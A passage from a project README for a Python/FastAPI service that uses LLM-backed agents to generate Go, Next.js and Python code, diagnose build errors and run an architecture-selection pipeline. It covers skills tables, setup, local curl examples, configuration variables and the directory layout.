- [x] LSP: detects ports without substitutable adapters and inconsistent contracts
- [x] ISP: flags fat interfaces; recommends segregation and BFF patterns
- [x] DIP: detects high-level modules depending on concrete infra; recommends abstraction injection
- [x] Architecture-level analysis — works on design schemas, not source files
- [x] Cross-principle correlations — at least 3 cascade scenarios detected
- [x] 8 test scenarios with known violations, all passing
- [x] Analysis completes in < 10 seconds for 30 components
- [x] Auto-triggered after design partner — users never invoke the agent directly
- [x] SOLID MCP at `/mcp/solid` with three tools
- [x] Plug-and-play: no existing functionality removed

---

## GoAgent — 31 Skills

### Shared Skills (framework-agnostic)

| Skill | Generates |
|---|---|
| `go.setup_project` | `go.mod`, `main.go`, folder structure (`cmd/`, `internal/`, `pkg/`), DI bootstrap |
| `go.go_struct` | Domain structs + request/response DTOs with `json`, `validate`, `db` tags |
| `go.repository` | Repository interface + pgx/v5 PostgreSQL implementation |
| `go.service` | Service layer with business logic injected via repository interface |
| `go.docker_setup` | Multi-stage Dockerfile (builder → distroless) + `docker-compose.yml` |
| `go.test_suite` | testify/suite unit tests + mockery-generated mocks, table-driven patterns |
| `go.generate_migration` | SQL migration files (up/down) for golang-migrate + CLI runner |
| `go.config` | Config struct + viper loader for env/YAML |
| `go.logger` | Structured logging setup with uber-go/zap + request-scoped middleware |

### Medical-App-Core Pattern Skills

Four additive skills that model the production patterns from the Medical-App-Core reference project — **Fiber v2 + GORM + PostgreSQL + Swagger + godotenv** — generating complete, production-ready Go services without any dependency on the HuggingFace API.

| Skill | Generates |
|---|---|
| `go.fiber_full_project` | Complete project scaffold: `go.mod` (Fiber v2 + GORM + JWT v4 + Swagger + godotenv + uuid), `cmd/main.go` with 5-step init sequence (godotenv → InitialDB → RunMigrations → InitServices → Fiber → Swagger → routes → Listen), `.env.example`, `Makefile` |
| `go.initializers` | Centralised `initializers/` package: `database.go` (GORM + PostgreSQL connection pool, MaxOpenConns=50), `services.go` (Services DI container + `InitServices(db)`), `migrations.go` (uuid-ossp extension + `AutoMigrate`), `validators.go` (CPF, SSN, CNPJ, NPI) |
| `go.gorm_entity` | `domain/entities/{resource}.go` (GORM entity, UUID primary key via `uuid_generate_v4()`, gorm.Model embedding), `services/contracts/{resource}ContractService.go` (service interface), `domain/dtos/{resource}DTO.go` (InputDTO + DTO) |
| `go.swagger_fiber` | `internal/app/swagger.go` (Swagger UI at `/swagger/*` with HTTP basic auth from env vars), `controllers/{resource}Controller.go` (annotated with swaggo `@Summary`, `@Param`, `@Success`, `@Security BearerAuth`), `docs/docs.go` stub (replaced by `swag init`) |

**Example — scaffold a full service in one command:**

```bash
agents generate "Go medical records API with Fiber, PostgreSQL, JWT auth, and Swagger" \
  --name medical-api --language go --framework fiber
```

Or execute the skills directly in sequence:

```http
POST /skills/execute
{ "agent": "go", "skill": "go.fiber_full_project",
  "params": { "module_name": "github.com/org/medical-api", "app_name": "Medical API", "port": "3040" } }

POST /skills/execute
{ "agent": "go", "skill": "go.initializers",
  "params": { "module_name": "github.com/org/medical-api", "resources": "patient,appointment,doctor" } }

POST /skills/execute
{ "agent": "go", "skill": "go.gorm_entity",
  "params": { "resource": "patient", "module_name": "github.com/org/medical-api",
               "fields": "name:string,birth_date:time,cpf:string,active:bool" } }
```

### HTTP Framework Skills

| Framework | Skills |
|---|---|
| **Fiber v2** | `go.fiber_app`, `go.fiber_handler`, `go.fiber_routes`, `go.fiber_middleware` |
| **Gin** | `go.gin_app`, `go.gin_handler`, `go.gin_routes`, `go.gin_middleware` |
| **Gorilla Mux** | `go.gorilla_app`, `go.gorilla_handler`, `go.gorilla_routes` |
| **Echo v4** | `go.echo_app`, `go.echo_handler`, `go.echo_routes`, `go.echo_middleware` |
| **Chi v5** | `go.chi_app`, `go.chi_handler`, `go.chi_routes` |

### Go Stack

| Concern | Library |
|---|---|
| Database (pgx pattern) | `jackc/pgx/v5` |
| Database (GORM pattern) | `gorm.io/gorm` + `gorm.io/driver/postgres` |
| Validation | `go-playground/validator/v10` |
| Auth / JWT | `golang-jwt/jwt/v4` (GORM pattern) · `golang-jwt/jwt/v5` (pgx pattern) |
| ORM / Migrations | `gorm.io/gorm` AutoMigrate · `golang-migrate/migrate/v4` |
| API Docs | `swaggo/swag` + `gofiber/swagger` |
| Config / Env | `spf13/viper` · `joho/godotenv` |
| Testing | `testify/suite` + `mockery` |
| Logging | `uber-go/zap` |

---

## DiagnosticAgent — 3 Skills

Pattern-based and LLM-assisted error diagnosis for Go, Next.js, and Python projects. Diagnostic skills are triggered automatically by `agents ask` when an error is described, or explicitly via `agents diagnose`.

| Skill | Fixes |
|---|---|
| `diagnostic.go_diagnose` | Go version mismatch in Dockerfile, wrong build path, missing `go.sum`, unused imports, undefined symbols, type mismatches |
| `diagnostic.nextjs_diagnose` | TypeScript type errors, missing dependencies, module resolution failures, Next.js config issues |
| `diagnostic.python_diagnose` | Import errors, syntax errors, missing packages, incompatible dependency versions |

**How it works:**

```
Error output received
        │
        ▼
Pattern matching (no LLM, deterministic)
  • go_version_mismatch    → fix Dockerfile FROM line
  • dockerfile_build_path  → fix RUN go build path to ./cmd
  • missing_go_sum         → instruct: go mod tidy && go mod download
  • missing_module         → instruct: go get <module>
  • unused_import          → remove the import from source file
  • undefined_symbol       → report with context
        │
        ▼ (if no pattern matches)
LLM-based analysis
  → LLM proposes JSON patch: {"fixes": [{"file": "...", "patch": "..."}]}
        │
        ▼ (if LLM unavailable or fails)
Generic diagnostic report written to diagnostic_report.md
```

---

## Architecture Pipeline (detailed)

```
[Natural Language Objective]
        ↓
[BusinessObjectiveParserAgent]
  — Extracts 7 requirement dimensions (scalability, compliance, availability, …)
  — Multi-turn clarification support
        ↓
[SolutionArchitectureDecisionEngine]
  — Rule-based pattern selection (microservices, hexagonal, monolith, …)
  — Bypassed when architecture_pattern is forced in the request
        ↓
[SolutionFlowDiagramAgent] → [ValidationAgent]
        ↓
[ArchitecturePatternSelector]
  — Fitness scoring matrix: 5 dimensions × 3 design partners
  — Deterministic weighted score per partner (no LLM call)
  — Hybrid activation: Microservices + Hexagonal when both score ≥ 0.65
    and score gap ≤ 0.15
  — Produces DesignPartnerPlan with per-partner scores + rejection reasons
        ↓
[DesignPartnerOrchestrator]
  — Routes to: Hexagonal | Microservices | Monolith design partner
  — Hybrid mode: activates both Microservices + Hexagonal in sequence
        ↓
[WorkflowCoordinator]
  — Routes to GoAgent or BackendAgent based on backend_language
  — Generates frontend artifacts via NextJSAgent + DesignAgent
  — Writes every file to disk at output_dir/project_name/
```

### Requirement Dimensions

| Dimension | Examples |
|-----------|---------|
| `scalability` | expected users, peak load, growth rate |
| `availability` | target uptime (SLA), RTO, RPO |
| `compliance` | GDPR, HIPAA, SOC2, PCI-DSS, ISO 27001 |
| `domain_boundaries` | e-commerce, fintech, healthcare, SaaS, IoT |
| `integration` | Stripe, Kafka, REST/gRPC/WebSocket patterns |
| `budget` | startup / mid-market / enterprise tier |
| `team_size` | engineering headcount, organisational maturity |

### Architecture Pattern Selector

`ArchitecturePatternSelector` runs a **deterministic weighted fitness scoring matrix** across 5 signal dimensions and 3 design partners, producing a `DesignPartnerPlan` with full per-partner scores and rejection reasons. No LLM call is required.

#### Scoring Matrix

| Dimension | Weight | Microservices | Hexagonal | Monolith |
|---|---|---|---|---|
| `scalability_demand` | 30 % | 0.95 | 0.48 | 0.18 |
| `domain_complexity` | 25 % | 0.62 | 0.95 | 0.28 |
| `large_team` | 20 % | 0.88 | 0.60 | 0.12 |
| `operational_maturity` | 15 % | 0.90 | 0.65 | 0.22 |
| `time_to_market_pressure` | 10 % | 0.12 | 0.38 | 0.92 |

#### Hybrid Activation

When both **Microservices** and **Hexagonal** score ≥ 0.65 normalised *and* their gap is ≤ 0.15, both partners are activated in sequence (`activation_order` 1 and 2). This is the only supported hybrid pair.

#### DesignPartnerPlan schema

```json
{
  "plan_id": "uuid",
  "decision_id": "uuid",
  "is_hybrid": false,
  "scoring_deterministic": true,
  "selected_partners": [
    {
      "partner_name": "microservices_design_partner",
      "activation_order": 1,
      "rationale": "...",
      "configuration": { "parameters": {} }
    }
  ],
  "rationale": {
    "summary": "...",
    "primary_signals": ["scalability_demand", "large_team"],
    "hybrid_reason": null,
    "per_partner_scores": [
      {
        "partner_name": "microservices_design_partner",
        "fitness_score": 0.847,
        "selected": true,
        "rejection_reason": null,
        "dimension_scores": [...]
      }
    ]
  }
}
```

---

## Requirements

- Python 3.12+
- **Grok (xAI) account (primary, forced)** — create token at [console.x.ai](https://console.x.ai/) and set `GROCK_API_TOKEN` in `.env` (never commit the value). See `GROCK_API_TOKEN` in `.env` — the code reads it via `os.getenv` and never logs/returns it.
- Hugging Face account (fallback) — free token at [huggingface.co/settings/tokens](https://huggingface.co/settings/tokens) with **Inference** permission enabled. Used only if `GROCK_API_TOKEN` is not set or Grok returns 403/429/timeout.

---

## Setup

```bash
# 1. Clone and enter the project
git clone <repo-url>
cd ai-agents-mcp-tools

# 2. Create a virtual environment
python -m venv venv
source venv/bin/activate   # Windows: venv\Scripts\activate

# 3. Install all dependencies
make install
# or: pip install -e ".[dev]"

# 4. Configure environment
cp .env.example .env
# Edit .env — set GROCK_API_TOKEN (primary, forced) and optionally HUGGINGFACE_TOKEN as fallback
# Example .env (do not commit real values):
# GROCK_API_TOKEN=xai-...
# GROK_MODEL=grok-3
# HUGGINGFACE_TOKEN=hf_...
# LLM_MODEL_1=Qwen/Qwen2.5-Coder-32B-Instruct  # fallback
# LLM_MODEL_2=openai/gpt-oss-120b
# GROCK_API_TOKEN is read via os.getenv("GROCK_API_TOKEN") and never logged or returned in API responses
```

---

## Running

### Development

```bash
make dev      # hot-reload on port 3030
make run      # without reload
make stop     # kill the process
make test     # full test suite
make lint     # ruff linter
```

API: `http://localhost:3030`  
Interactive docs: `http://localhost:3030/docs`

### Production

```bash
uvicorn app.main:app --host 0.0.0.0 --port 6000
```

### CLI against a local API

```bash
AGENTS_API_URL=http://localhost:6000 agents ask "minha aplicação Go não está compilando" \
  --path /path/to/project
```

---

## Quick API Test (curl)

Start the server first:
```bash
uvicorn app.main:app --host 0.0.0.0 --port 6000
```

Then test with curl:

```bash
# Health check
curl http://localhost:6000/health

# List all agents
curl http://localhost:6000/agents

# List all 118 skills
curl http://localhost:6000/skills

# List skills for a specific agent
curl "http://localhost:6000/skills?agent=go"
curl "http://localhost:6000/skills?agent=diagnostic"
curl "http://localhost:6000/skills?agent=nextjs"

# Execute a skill directly (Go: generate Fiber handler)
curl -X POST http://localhost:6000/skills/execute \
  -H "Content-Type: application/json" \
  -d '{
    "agent": "go",
    "skill": "go.fiber_handler",
    "params": {
      "resource": "order",
      "module_name": "github.com/org/order-service"
    }
  }'

# Natural language intent routing (Portuguese)
curl -X POST http://localhost:6000/workflow/ask \
  -H "Content-Type: application/json" \
  -d '{
    "query": "criar uma entidade Product com os campos name, price e active",
    "project_context": {
      "project_type": "go",
      "file_count": 1,
      "files": [
        { "path": "go.mod", "content": "module github.com/org/store\n\ngo 1.24\n" }
      ]
    }
  }'

# Diagnose and fix Go error
curl -X POST http://localhost:6000/workflow/diagnose \
  -H "Content-Type: application/json" \
  -d '{
    "language": "go",
    "error_output": "stat /app/cmd/server: directory not found",
    "source_files": [
      { "path": "Dockerfile", "content": "FROM golang:1.24-alpine AS builder\nWORKDIR /app\nCOPY . .\nRUN go build -o server ./cmd/server\nFROM alpine:latest\nCOPY --from=builder /app/server /server\nCMD [\"/server\"]" },
      { "path": "go.mod", "content": "module github.com/org/service\n\ngo 1.24\n" }
    ],
    "module_name": "github.com/org/service"
  }'

# Full project scaffold
curl -X POST http://localhost:6000/workflow/scaffold \
  -H "Content-Type: application/json" \
  -d '{
    "objective": "Go microservice for order management with Fiber, PostgreSQL, JWT auth",
    "project_name": "order-service",
    "output_dir": "/tmp",
    "scope": "backend",
    "backend_language": "go",
    "backend_framework": "fiber"
  }'

# Architecture pipeline - parse business objective
curl -X POST http://localhost:6000/architecture/parse \
  -H "Content-Type: application/json" \
  -d '{
    "objective": "Build a HIPAA-compliant telemedicine platform for 10,000 concurrent patients"
  }'

# MCP endpoints
curl http://localhost:6000/mcp/architecture
curl http://localhost:6000/mcp/backend
curl http://localhost:6000/mcp/frontend
curl http://localhost:6000/mcp/orchestrate
curl http://localhost:6000/mcp/solid
curl http://localhost:6000/mcp/design-patterns
curl http://localhost:6000/mcp/quality-assessment
```

---

## Configuration

| Variable | Default | Description |
|---|---|---|
| `GROCK_API_TOKEN` | — | **Primary, forced.** xAI Grok API token. Set only on server `.env`. Read via `os.getenv("GROCK_API_TOKEN")` (`app/llm/grok.py:53`, `app/llm/factory.py:27`), masked as `xai***XXXX` in logs (`app/llm/grok.py:61`), never returned in responses. |
| `GROK_MODEL` | `grok-3` | Grok model for general/planning/code. Alternatives: `grok-3-fast`, `grok-3-mini`, `grok-code-fast-1` (`app/llm/grok.py:10`) |
| `GROK_API_BASE_URL` | `https://api.x.ai/v1` | xAI base URL (OpenAI-compatible) |
| `HUGGINGFACE_TOKEN` | — | **Fallback.** Hugging Face API token (Inference permission required). Used only if `GROCK_API_TOKEN` missing or Grok returns 403/429/timeout |
| `LLM_MODEL_1` | `meta-llama/Llama-3.1-8B-Instruct` | General-purpose model — used in dual extraction fallback |
| `LLM_MODEL_2` | `Qwen/Qwen2.5-Coder-7B-Instruct` | Code-specialized model — used in dual extraction fallback |
| `LLM_MAX_TOKENS` | `4096` | Maximum output tokens per request |
| `LLM_TEMPERATURE` | `0.1` | Sampling temperature |
| `API_HOST` | `0.0.0.0` | Server bind address — must be `0.0.0.0`, not `localhost:6000` (`app/main.py:1529`) |
| `API_PORT` | `3030` | Server port (`API_PORT=6000` for local, `3443` for `make dev` in `Makefile:8`) |
| `API_BASE_URL` | — | Public URL of this service (injected into the CLI install script at `app/cli/install.sh:4`) |
| `AGENTS_API_URL` | — | URL the CLI binary uses to reach the API (baked at build via `app/cli/_build_config.py`) |

### Recommended Models

```
# Code-specialized (LLM_MODEL_2)
Qwen/Qwen2.5-Coder-7B-Instruct
deepseek-ai/DeepSeek-Coder-V2-Lite-Instruct
codellama/CodeLlama-13b-Instruct-hf

# General purpose (LLM_MODEL_1)
meta-llama/Llama-3.1-8B-Instruct
microsoft/Phi-3.5-mini-instruct
```

---

## Project Structure

```
app/
├── agents/
│   ├── base.py                  # BaseAgent, AgentResult, AgentContext
│   ├── orchestrator.py          # AgentOrchestrator — BM25 routing + coordination
│   ├── go_agent.py              # GoAgent — 31 skills across 5 HTTP frameworks
│   ├── backend_agent.py         # Python/FastAPI specialist
│   ├── nextjs_agent.py          # Next.js App Router specialist
│   ├── design_agent.py          # UI/UX and design systems specialist
│   ├── frontend_agent.py        # React frontend patterns specialist
│   ├── vercel_agent.py          # Vercel deployment specialist
│   ├── diagnostic_agent.py      # DiagnosticAgent — Go, Next.js, Python error fixing
│   └── solid_agent.py           # SOLIDPrinciplesEnforcerAgent — auto-triggered after design partner
├── skills/
│   ├── base.py                  # BaseSkill, SkillResult, CodeArtifact, SkillCategory
│   ├── registry.py              # SkillRegistry — @SkillRegistry.register decorator
│   ├── go/
│   │   ├── shared/
│   │   │   ├── setup_project.py     # go.setup_project + go.fiber_full_project
│   │   │   ├── go_struct.py
│   │   │   ├── repository.py
│   │   │   ├── service.py
│   │   │   ├── docker_setup.py
│   │   │   ├── test_suite.py
│   │   │   ├── migration.py
│   │   │   ├── config.py
│   │   │   ├── logger.py
│   │   │   ├── initializers.py      # go.initializers (centralised DI package)
│   │   │   ├── gorm_entity.py       # go.gorm_entity (GORM entity + contract + DTOs)
│   │   │   └── swagger.py           # go.swagger_fiber (Swagger UI + basicauth)
│   │   └── http/                # fiber, gin, gorilla, echo, chi
│   ├── backend/                 # fastapi_endpoint, sqlalchemy_model, …
│   ├── nextjs/                  # components, routing, data_fetching, auth, …
│   ├── design/                  # tailwind, shadcn, color_system, typography, …
│   ├── frontend/                # state_management, forms, i18n, performance, …
│   ├── vercel/                  # deployment, environment, edge_config, analytics
│   ├── diagnostic/
│   │   ├── __init__.py
│   │   ├── go_diagnose.py       # diagnostic.go_diagnose — pattern-based + LLM fallback
│   │   ├── nextjs_diagnose.py   # diagnostic.nextjs_diagnose
│   │   └── python_diagnose.py   # diagnostic.python_diagnose
│   └── solid/                   # SOLID Principles skills — 5 skills, SkillCategory.SOLID
│       ├── __init__.py
│       ├── srp_skill.py         # solid.srp_analyze — Single Responsibility
│       ├── ocp_skill.py         # solid.ocp_analyze — Open/Closed
│       ├── lsp_skill.py         # solid.lsp_analyze — Liskov Substitution
│       ├── isp_skill.py         # solid.isp_analyze — Interface Segregation
│       └── dip_skill.py         # solid.dip_analyze — Dependency Inversion
├── architecture/
│   ├── agents/
│   │   ├── business_objective_parser.py
│   │   ├── decision_engine.py
│   │   ├── solution_flow_diagram.py
│   │   ├── validation_agent.py
│   │   ├── architecture_pattern_selector.py  # fitness scoring matrix + hybrid activation
│   │   └── system/              # hexagonal, microservices, monolith design partners
│   ├── context/
│   │   └── pipeline_context.py  # PipelineContext — shared state across pipeline
│   ├── schemas/
│   │   ├── requirements.py      # ArchitectureRequirements
│   │   ├── solution.py          # SolutionArchitectureDecision
│   │   ├── system_design.py
│   │   ├── workflow.py
│   │   ├── solid.py             # SOLIDComplianceReport, PrincipleResult, NormalizedDesignInput
│   │   └── design_partner_plan.py  # DesignPartnerPlan, PartnerScore, PartnerActivation
│   └── workflow_coordinator.py  # End-to-end pipeline + code generation router
├── cli/
│   ├── commands.py              # Typer CLI — ask, generate, improve, diagnose, list-skills, version
│   ├── client.py                # AgentsClient — HTTP client for the API
│   ├── intent_router.py         # Natural language → agent/skill routing + language detection
│   ├── project_scanner.py       # Scans existing projects, detects type, reads files
│   └── platforms/
│       ├── linux.py             # LinuxPlatformAgent — file writing, path resolution
│       └── windows.py           # WindowsPlatformAgent
├── llm/
│   ├── base.py                  # BaseLLMProvider interface
│   ├── bm25_index.py            # SkillBM25Index — in-memory BM25 skill routing
│   ├── huggingface.py           # AsyncInferenceClient (REST, no local model)
│   ├── dual_extractor.py        # Dual LLM param extraction — parallel + scoring
│   └── prompts.py               # System prompts per agent
├── mcp/
│   ├── architecture_mcp.py      # MCP server: parse, clarify, decide, select_design_partner
│   ├── backend_mcp.py           # MCP server: Python/FastAPI skills
│   ├── frontend_mcp.py          # MCP server: Next.js + design skills
│   ├── orchestrator_mcp.py      # MCP server: cross-agent orchestration
│   └── solid_mcp.py             # MCP server: SOLID compliance — analyze, get_report, get_principle_result
└── main.py                      # FastAPI app, all routes, lifespan
```

---

## Adding a Skill

1. Create a file in the appropriate category directory under `app/skills/`.
2. Subclass `BaseSkill`, set class attributes, implement `execute()`.
3. Decorate with `@SkillRegistry.register`.
4. Import the module in the package `__init__.py`.

```python
from app.skills.base import BaseSkill, SkillCategory, SkillResult, SkillParameter, CodeArtifact
from app.skills.registry import SkillRegistry

@SkillRegistry.register
class MySkill(BaseSkill):
    name = "go.my_skill"
    description = "Generate a custom Go component"
    category = SkillCategory.GO
    tags = ["go", "custom"]
    parameters = [
        SkillParameter("resource", "Resource name"),
    ]

    async def execute(self, resource: str, **kwargs) -> SkillResult:
        code = f"package main\n\n// {resource} generated\n"
        return SkillResult(
            success=True,
            summary=f"Generated {resource}",
            artifacts=[CodeArtifact(f"{resource}.go", code, "go")],
        )
```

---

## Development

```bash
make test       # run all tests
make lint       # ruff check
make format     # ruff format
```

---

## License

MIT
